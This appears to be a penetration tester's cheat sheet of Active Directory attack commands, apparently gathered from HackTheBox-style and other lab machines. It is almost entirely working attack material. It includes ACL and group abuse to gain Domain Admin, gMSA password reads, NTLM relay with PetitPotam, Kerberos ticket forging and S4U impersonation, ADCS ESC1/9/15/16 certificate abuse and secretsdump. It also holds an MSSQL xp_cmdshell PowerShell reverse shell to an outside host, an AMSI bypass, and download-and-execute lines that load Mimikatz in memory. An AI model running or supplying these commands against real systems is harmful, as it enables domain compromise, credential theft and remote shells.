dacledit.py rebound.htb/oorend:'1GR8t@$$4u' -k -dc-ip 10.129.232.31 -action write -rights FullControl -inheritance -principal oorend -target-dn "OU=Service Users,DC=rebound,DC=htb" -use-ldaps
bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
 
=> from windows with powerview :
   add-domainobjectacl -rights "all" -targetidentity "gpoadm" -principalidentity "Amelia.Griffiths"   

* addself to group 

user DN :
ldapsearch -x -H ldap://192.168.56.10 -D 'vagrant@sevenkingdoms.local' -w 'vagrant' -b "DC=sevenkingdoms,DC=local" "(sAMAccountName=omar)" dn  | grep '^dn:' | cut -d' ' -f2-

Group DN :
ldapsearch -x -H ldap://192.168.56.10 -D 'vagrant@sevenkingdoms.local' -w 'vagrant' -b "DC=sevenkingdoms,DC=local" "(sAMAccountName=domain admins)" dn  | grep '^dn:' | cut -d' ' -f2-

cat > add_to_group.ldif <<EOF
dn: CN=Domain Admins,CN=Users,DC=sevenkingdoms,DC=local
changetype: modify
add: member
member: CN=omar,CN=Users,DC=sevenkingdoms,DC=local
EOF

ldapmodify -x -H ldap://192.168.56.10 -D 'vagrant@sevenkingdoms.local' -w 'vagrant' -f add_to_group.ldif 
 
see verify group members :
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://192.168.56.10 -D 'vagrant@sevenkingdoms.local' -w 'vagrant' -b "DC=sevenkingdoms,DC=local" "(cn=Domain Admins)" member | awk '/^member: /{print $2}'                       

=> with TGT bloodyAD -d rebound.htb -u oorend -k --host dc01.rebound.htb add groupMember "SERVICEMGMT" oorend
=> without TGT bloodyAD --host DC.sendai.vl -d sendai.vl -u Thomas.Powell -p Qwer@123 add groupMember AdmSvc Thomas.Powell

* remove from group

bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'IT'  

* read gmsapassword

bloodyAD -d rebound.htb -u tbrady -p '543BOMBOMBUNmanda' --host dc01.rebound.htb get object 'delegator$' --resolve-sd --attr msDS-ManagedPassword 

* STATUS_PASSWORD_MUST_CHANGE 

netexec smb DC.sendai.vl -u Thomas.Powell -p '' -M change-password -o NEWPASS=Qwer@123
smbpasswd.py Thomas.Powell@DC.sendai.vl -newpass 'Qwer@123'

* disabled account

bloodyAD --host dc01.vintage.htb -k -d vintage.htb remove uac svc_sql -f ACCOUNTDISABLE

=> sometimes we need to clear login hours

cat > clear_login_hours.ldif <<EOF
dn: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
changetype: modify
delete: logonHours
EOF
 
ldapmodify -x -H ldap://10.10.11.78 -D "MIRAGE\\mark.bbond" -w '1day@atime' -f clear_login_hours.ldif

* restoring deleted object

Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties *
or
ldapsearch -x -H ldap://dc.voleur.htb \
  -D "svc_ldap@voleur.htb" -w 'M1XyC9pW7qT5Vn' \
  -b "DC=voleur,DC=htb" \
  -E '1.2.840.113556.1.4.417' \
  '(isDeleted=TRUE)' \
  distinguishedName objectGUID sAMAccountName msDS-LastKnownRDN msDS-LastKnownParent whenChanged

Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"

bloodyAD --host dc01.tombwatcher.htb -u john -p Qwer@123 -k -d tombwatcher.htb remove uac cert_admin -f ACCOUNTDISABLE
bloodyAD --host tombwatcher.htb -u john -p Qwer@123 -d tombwatcher.htb set password cert_admin Qwer@123

* reading writable objects for a user and modifying them

bloodyAD -u 'bob.w' -k -d 'hercules.htb' --host DC.hercules.htb get writable --detail 

KRB5CCNAME=bob.w.ccache powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps --dc-ip 10.10.11.91 -d --no-pass 

Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
  
--------------------
Recovering NTLM hash
--------------------
Certify.exe find /enrollable
 
Certify.exe request /ca:DC01.mist.htb\mist-DC01-CA /template:User 

openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx => empty password

Rubeus.exe asktgt /user:brandon.keywarp /certificate:cert.pfx /getcredentials /show /nowrap

------------------------
LDAP signing not enabled
------------------------
nxc ldap 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 -M ldap-checker

sc.exe query webclient 2>&1
or
.\EtwStartWebClient.exe  

.\chisel.exe client 10.10.16.47:8000 R:socks
.\chisel.exe client 10.10.16.47:8000 22301:127.0.0.1:80

proxychains -q ntlmrelayx.py -debug -t ldaps://192.168.100.100 -i -smb2support -domain mist.htb

proxychains python PetitPotam.py -u brandon.keywarp -hashes :DB03D6A77A2205BC1D07082740626CC9 -d mist.htb 'MS01@22301/whatever' 192.168.100.101 -pipe all

nc 127.0.0.1 11000
clear_shadow_creds MS01$
set_shadow_creds MS01$

sudo proxychains -q certipy cert -export -pfx KJNQDFsA.pfx -password rJptn57fg3n4kIRj7Xnc -out ms01.pfx                                       
proxychains -q certipy auth -pfx ms01.pfx -domain mist.htb -username MS01\$ -dc-ip 192.168.100.100 -ns 192.168.100.100

.\Rubeus.exe asktgt /nowrap /user:"ms01$" /rc4:d682d620b887a24491038115b6dc56bb
.\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:"cifs/ms01.mist.htb" /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEUDCCBExhggRIMIIERKADAgEFoQobCE1JU1QuSFRCoh0.\rubeus s4u /self /nowrap /impersonateuser:Administrator /altservice:"cifs/ms01.mist.htb" /ticket:<>

base64 -d administrator.kirbi.b64 > administrator.kirbi
ticketConverter.py administrator.kirbi administrator.ccache

KRB5CCNAME=administrator.ccache proxychains -q wmiexec.py administrator@ms01.mist.htb -k -no-pass 
KRB5CCNAME=administrator.ccache proxychains -q secretsdump.py administrator@ms01.mist.htb -k -no-pass

-----------------
SQL service abuse
-----------------
mssqlclient.py -windows-auth  darkzero.htb/john.w:'RFulUtONCOL!'@10.10.11.89

- impersonating sa Method 1

enum_links
use_link [PRIMARY]
use master
exec_as_login sa
enable_xp_cmdshell
EXEC xp_cmdshell 'powershell -NoProfile -ExecutionPolicy Bypass -Command "$C=new-object net.sockets.tcpclient(''10.10.16.97'',4444);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){$D=(new-object -typename System.Text.ASCIIEncoding).GetString($B,0,$I);$O=(iex $D 2>&1 | Out-String);$OB=$O+''PS ''+(pwd).Path+''> ''; $SB=([text.encoding]::ASCII).GetBytes($OB);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close()"'

- impersonating sa Method 2

EXEC sp_configure 'show advanced options', 1
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
EXEC xp_cmdshell 'powershell -NoProfile -ExecutionPolicy Bypass -Command "$C=new-object net.sockets.tcpclient(''10.10.16.97'',4444);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){$D=(new-object -typename System.Text.ASCIIEncoding).GetString($B,0,$I);$O=(iex $D 2>&1 | Out-String);$OB=$O+''PS ''+(pwd).Path+''> ''; $SB=([text.encoding]::ASCII).GetBytes($OB);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close()"'
 
- impersonating sa Method 3

nt.py 'purPLE9795!@' => to get nt hash
SELECT master.dbo.fn_varbintohexstr(SUSER_SID()); => to get domain SID
 
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain SIGNED -spn MSSQLSvc/DC01.signed.htb -groups 1105 -user-id 500 Administrator
impacket-ticketer -nthash EF699384C3285C54128A3EE1DDB1A0CC -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -spn MSSQLSvc/DC01.SIGNED.HTB -groups 512,519,1105 -user-id 1103 mssqlsvc
mssqlclient.py -k -no-pass DC01.signed.htb -windows-auth
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents; 

- Stealing hash

EXEC MASTER.sys.xp_dirtree '\\10.10.16.97\test', 1, 1

- nmap --script ms-sql-info,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=''  -sV -p 1433 172.16.100.98

------------
ADCS attacks
------------

* Enumeration 

certipy-ad find -u vagrant@sevenkingdoms.local -p vagrant -dc-ip 192.168.56.10 -vulnerable -stdout

=> ESC1
  
    - certipy req -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -template UserAuthentication -upn Administrator@sequel.htb -ca sequel-DC-CA -target dc.sequel.htb
    - certipy auth -pfx administrator.pfx -dc-ip 10.129.228.253

=> ESC9 
   this attack requires a user has privileges over the user who can perfom the attack to replace UPN of him to Administrator
 
   - certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41  
   - certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
   - certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41 
   - certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb

=> ESC15

   - certipy req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target-ip 10.10.11.72 -u cert_admin@tombwatcher.htb -p 'Qwer@123' -template WebServer -upn Administrator@tombwatcher.htb -application-policies 'Client Authentication' 
   - certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
       => # change_password administrator Qwer@123
  
=> ESC16
   this attack requires a user has privileges over the user who can perfom the attack to replace UPN of him to Administrator
   
   - certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'  
   - certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
   - certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc@fluffy.htb'
   - certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.10.11.69
  
-------------------------
bloodhound cypher Queries
-------------------------
MATCH p = (d:Domain)-[:Contains*1..]->(n:Computer)
RETURN p

MATCH p = (d:Domain)-[:Contains*1..]->(n:User)
RETURN p

MATCH p = (d:Domain)-[:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User)
RETURN p

MATCH (P:User)
WHERE P.hasspn = true
RETURN P

MATCH (c:Computer {unconstraineddelegation:true})
RETURN c

MATCH (n:GPO)
RETURN n

MATCH (n:User {dontreqpreauth:true})
RETURN n

MATCH p = (u:User)-[r1]->(n)
WHERE r1.isacl = true
RETURN p


---------------------
evil-winrm over https
---------------------

git clone https://github.com/ozelis/winrmexec.git
KRB5CCNAME=Auditor.ccache python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
 




$amsi = [AppDomain]::CurrentDomain.GetAssemblies() |
Where-Object { $_.FullName -like "*Management.Automation*" } |
ForEach-Object { $_.GetType("System.Management.Automation.AmsiUtils") }
$field = $amsi.GetField("amsiInitFailed", "NonPublic,Static")
$field.SetValue($null, $true)

$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET', 'https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Gather/Invoke-Mimikatz.ps1', $false)
$h.send()
iex $h.responseText


$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET', 'https://raw.githubusercontent.com/lucky-luk3/ActiveDirectory/refs/heads/master/PowerView.ps1', $false)
$h.send()
iex $h.responseText


$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET', 'http://192.168.56.133:8989/Invoke-Mimikatz.ps1', $false)
$h.send()
iex $h.responseText

$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET', 'http://192.168.56.133:8989/Powerview.ps1', $false)
$h.send()
iex $h.responseText





